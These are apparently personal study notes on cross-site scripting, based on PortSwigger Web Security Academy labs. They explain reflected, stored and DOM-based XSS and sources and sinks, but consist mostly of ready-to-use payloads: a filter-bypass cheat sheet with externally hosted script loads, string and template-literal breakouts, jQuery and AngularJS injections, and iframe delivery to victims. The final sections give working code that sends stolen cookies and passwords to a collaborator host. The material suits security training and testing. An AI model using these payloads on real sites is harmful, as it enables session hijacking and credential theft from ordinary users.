[Cross-Site Scripting (XSS) Cheat Sheet - 2023 Edition | Web Security Academy (portswigger.net)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

It’s a type of injection which can allow an attacker to **execute malicious JavaScript** and have it execute on a victim’s machine.

1.  Stored XSS - the ***most dangerous type of XSS***. This is where a **malicious string originates from the website’s database**. This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the database.
2.  Reflected XSS - the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an *attacker needs to trick a victim into clicking a URL to execute their malicious payload*.
3.  DOM-Based XSS - DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that **programs can change the document structure, style and content**. A web page is a document and this document can be either displayed in the browser window or as the HTML source.



---
# Reflected & Stored XSS
Suppose a website has a search function which receives the user-supplied search term in a URL parameter:
`https://insecure-website.com/search?term=gift`

The application echoes the supplied search term in the response to this URL:
`<p>You searched for: gift</p>`

Assuming the application doesn't perform any other processing of the data, an attacker can construct an attack like this:
`https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>`

This URL results in the following response:
`<p>You searched for: <script>/* Bad stuff here... */</script></p>`


***If most of the tags & attributes are blocked, perform a Bruteforce with all the tags & attributes from the Cheatsheet!***

***If All Event Listeners & href Attributes are Blocked, use the below cheatsheet :-***
```cheatsheet
<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
<d3"<"/onclick="1>[confirm``]"<">z
<d3/onmouseenter=[2].find(confirm)>z
<details open ontoggle=confirm()>
<script y="><">/*<script* */prompt()</script
<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
<a href="javascript%26colon;alert(1)">click
<a href=javas&#99;ript:alert(1)>click
<script/"<a"/src=data:=".<a,[8].some(confirm)>
<svg/x=">"/onload=confirm()//
<--`<img/src=` onerror=confirm``> --!>
<svg%0Aonload=%09((pro\u006dpt))()//
<sCript x>(((confirm)))``</scRipt x>
<svg </onload ="1> (_=prompt,_(1)) "">
<!--><script src=//14.rs>
<embed src=//14.rs>
<script x=">" src=//15.rs></script>
<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
<iframe/src \/\/onload = prompt(1)
<x oncut=alert()>x
<svg onload=write()>
```

Taken From :-
[s0md3v/AwesomeXSS: Awesome XSS stuff (github.com)](https://github.com/s0md3v/AwesomeXSS#awesome-payloads)



#### Bypass HTML Encoding
- **Backend Code**
![[Pasted image 20230604213003.png]]

`<` And `>` are HTML Encoded so normal XSS Payload <u>won't work</u>!

- **XSS Payload with <>**
![[Pasted image 20230604213329.png]]

- **Bypass**
```XSS
" autofocus onfocus=alert(document.domain) x="
```

![[Pasted image 20230604213448.png]]


- If `<, >, "` are HTML Encoded then, check where the input is going
- If it's going inside **href** field, use `javascript:alert(1)`


### XSS in Canonical Links
- If you don't see any Input Field, **Insert a Parameter of your own in the URL**
```
// Example

Before: https://0a2c0023039d95ac8053859e00b70062.web-security-academy.net/
After: https://0a2c0023039d95ac8053859e00b70062.web-security-academy.net/?id=1
```

- Check the Source Code to learn how the input is getting accepted. If ' is not encoded then use that!
- Craft the Payload
```
accesskey="X" onclick="alert(1)"
Example: https://0a2c0023039d95ac8053859e00b70062.web-security-academy.net/?id=1' accesskey='X' onclick='alert(1)
```

- If **%20** is coming in the Canonical Link, Try to Replace it with **%09** & see if that works!
- Else, ***don't use any spaces*** :)

%% Same goes for Hidden Input Fields! %%



### XSS into JavaScript
1) **Terminating the existing script**
In the simplest case, it is possible to *simply close the script tag* that is enclosing the existing JavaScript, and *introduce some new HTML tags* that will trigger execution of JavaScript. For example, if the XSS context is as follows:-
```
<script> ... var input = 'controllable data here'; ... </script>
```
***Payload*** :-
```XSS
</script><img src=1 onerror=alert(document.domain)>
```

The reason this works is that the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts. The above payload leaves the original script broken, with an unterminated string literal. But that doesn't prevent the subsequent script being parsed and executed in the normal way.


2) **Breaking out of JavaScript String**
Same as above
Payloads :-
```XSS
'-alert(document.domain)-' 
			OR
';alert(document.domain)//
```

Some applications attempt to prevent input from breaking out of the JavaScript string by escaping any single quote characters with a backslash.

For example, suppose that the input:
`';alert(document.domain)//`

gets converted to:
`\';alert(document.domain)//`

You can now use the alternative payload:
`\';alert(document.domain)//`

which gets converted to:
`\\';alert(document.domain)//`


3) **XSS Directly from URL**
Backend Code :-
```js
[javascript:fetch('/analytics', {method:'post',body:'/post?postId=1'}).finally(_ => window.location = '/')](about:blank)
```

Payload :-
```copy
https://YOUR-LAB-ID.web-security-academy.net/post?postId=1&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```

- **&** : Seperates Two Parameters
- **'}**: breaks out of body:'/post?postId=1'}. The code should now look like `fetch('/analytics', {method:'post',body:'/post?postId=1&'}'}).finally(_ => window.location = '/')`
- **,x=x=>{throw//onerror=alert,1337},toString=x,window+'',** is a fancy way to call `alert(1337)`. It basically overwrites the `toString` method and triggers it. `,toString=alert(1337),window+'',` doesn't work, since `(` and `)` are blocked. The `,` separation is important to not break the JavaScript.
-   **{x:'** : is supplied to not break the JavaScript.

In the end the fetch call looks like this:
```js
fetch('/analytics', {method:'post',body:'/post?postId=1&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:''}).finally(_ => window.location = '/')
```



#### Bypass By HTML Encoding
When the XSS context is *some existing JavaScript within a quoted tag attribute, such as an event handler*, it is possible to make use of *HTML-encoding* to work around some input filters. When the browser has parsed out the HTML tags and attributes within a response, it will perform HTML-decoding of tag attribute values before they are processed any further.
For example, if the XSS context is as follows:
```html
<a href="#" onclick="... var input='controllable data here'; ...">
```

and the **application blocks or escapes single quote characters**, you can *use the following payload* to break out of the JavaScript string and execute your own script:
```XSS
&apos;-alert(document.domain)-&apos;
OR
&apos;);alert(1);//
```

The `&apos;` sequence is an HTML entity representing an apostrophe or single quote. Because the browser HTML-decodes the value of the `onclick` attribute before the JavaScript is interpreted, the entities are decoded as quotes, which become string delimiters, and so the attack succeeds.

If Vulnerability in Website Input :-
`http://foo?&apos;-alert(1)-&apos;`


### XSS in JavaScript template literals
For example, the following script will print a welcome message that includes the user's display name:
``document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;``

When the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the `${...}` syntax to embed a JavaScript expression that will be executed when the literal is processed. For example, if the XSS context is as follows:
``<script> ... var input = `controllable data here`; ... </script>``

then you can use the following payload to execute JavaScript without terminating the template literal:
```XSS
${alert(document.domain)}
```



---

1) **onresize tag**
	- Use `<iframe src="" onresize="jscode" onload="this.style.width=100px">`
	- this.style.width will automatically resize the iframe thus running JS Code
	- Send the link with iframe tags & attributes to the victim

2) **custom tags**
	1. *onfocus*
```XSS
<xss autofocus tabindex=1 onfocus=alert(1)></xss>
```
	If the code executes successfully, Copy the url of the executed code & include it in a <script> tag with window.location.href


3) **SVG Payload**
You can write HTML inside SVG!
For Example, we need to create this Payload :-
```HTML
<a href="javascript:alert(1)">Click Here</a>
```

To do this in SVG, 
```svg
<svg>
<a>
<animate attributeName="href" values="javascript:alert(1)">
<text x="20" y="20">Click Here</text>                        // x & y are compulsory in text
</a>
</svg>
```


---
# DOM-Based XSS
- Attack wherein the attack Payload is executed as a *result* of *modifying* the *DOM* "environment" in the the victim's browser used by the *original* client side script.
- Client side code runs in an "unexpected" manner.
- Page itself does *not* change, but the client side code contained in the page executes *differently*.

![[Pasted image 20230607110827.png]]

- [ ] **Source**
	- Javascript *property* that contains data that an attacker could potentially *control*.
	- The source is the property that is *read* from the DOM.
	OR
	- Source is the *input* where the payload is *injected*.

	<u><mark style="background: #ABF7F7A6;">Examples</mark></u> :-
	- **Document URLs** :-
		- document.URL
		- document.documentURL
		- location
		- location.href
		- location.search
		- location.hash

	- **Referrer**
		- document.referrer

	- **Window Name**
		- window.name



- [ ] **Sink**
	- Function or DOM Object that *allows* JavaScript code *execution* or *rendering* of HTML.
	- *Points* in the *flow of data* at which the untrusted input gets *outputed* on the page or *executed* by JavaScript *within* in the page.

	<mark style="background: #ABF7F7A6;">Examples</mark> :-
	- **HTML Element**
		- document.write
		- document.writeIn
		- innerHTML
		- outerHTML
		- insertAdjacentHTML

	- **Execution Sink**
		- eval
		- setTimeout
		- setInterval

	- **Location**
		- location
		- location.href


### Exploiting DOM XSS with different sources and sinks

1) **Back-End Code**
```JavaScript
<script>
function trackSearch(query) {
document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}

var query = (new URLSearchParams(window.location.search)).get('search');

if(query) {
trackSearch(query);
}
</script>
```

Our Query is going in search, plus the query is *getting executed* by trackSearch(query);

**Exploit** :-
```JavaScript
" onload="alert(1)"
OR
"> <script>alert(1)</script>//
```


2) **Adding a new Query Parameter**

Back-End Code :-
```Javascript
<script>
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');

document.write('<select name="storeId">');

if(store) {
document.write('<option selected>'+store+'</option>');
}

for(var i=0;i<stores.length;i++) {
if(stores[i] === store) {
continue;
}

document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
</script>
```

But **storeID** is not present in the URL, so we manually add it!

Exploit :-
```Javascript
product?productId=1&storeId="><script>alert(1)</script>
```


3) **XSS in innerHTML Sink**

The `innerHTML` sink doesn't accept `script` elements on any modern browser, nor will `svg onload` events fire. This means you will need to use alternative elements like `img` or `iframe`.

Example :-
```JavaScript
element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
```

If the code **escapes Angular Brackets** using replace function :-
```js
function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
```
It *only replaces the first occurences*!

Exploit :-
```js
<><img src=1 onerror="alert(1)">
```




### Sources and sinks in third-party dependencies

#### DOM XSS in jQuery
 1) jQuery's `attr()` function can change the attributes of DOM elements. If data is read from a user-controlled source like the URL, then passed to the `attr()` function, then it may be possible to manipulate the value sent to cause XSS. For example, here we have some JavaScript that changes an anchor element's `href` attribute using data from the URL :-
```javascript
$(function() { $('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl')); });
```

Exploit :-
```url
?returnUrl=javascript:alert(document.domain)
```


2)  jQuery's `$()` selector function  can be used to inject malicious objects into the DOM.
DOM XSS vulnerability was caused by websites using this selector in conjunction with the `location.hash` source for animations or auto-scrolling to a particular element on the page. This behavior was often implemented using a vulnerable `hashchange` event handler, similar to the following:
```JS
$(window).on('hashchange', function() { var element = $(location.hash); element[0].scrollIntoView(); });
```

As the `hash` is user controllable, an attacker could use this to inject an XSS vector into the `$()` selector sink. More *recent versions of jQuery have patched this particular vulnerability by preventing you from injecting HTML into a selector when the input begins with a hash character* (`#`). However, *you may still find vulnerable code* in the wild.

Exploit :-
```js
https://[Vulnerable Website]/#<img src=1 onerror=print()>

// While Delivering to your victim :-
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=print()>'">
// This is done because we have to make a hash change automatically without user interaction
```



#### DOM XSS in AngularJS
When a site uses the `ng-app` attribute on an HTML element, it will be *processed by AngularJS*. In this case, **AngularJS will execute JavaScript inside double curly braces** that can occur directly in HTML or inside attributes.

Exploit :-
```js
{{constructor.constructor('alert(1)')()}}
OR
{{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
```

For **More Exploits**, [Visit Here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md)

---
## Steal Cookies with XSS
1) Find XSS Vulnerability
2) Use Burp Collaborator
3) Exploit Code :-
```js
<script> fetch('https://[burp-collaboratordomain]',{method: 'POST', mode: 'no-cors', body: document.cookie}); </script>
```
OR
Use Pre-Made Scripts From [Here](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md)



## Steal Passwords With XSS
- Create a Login Form with username & password in the Vulnearable Input Field
- Exploit
```js
<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```

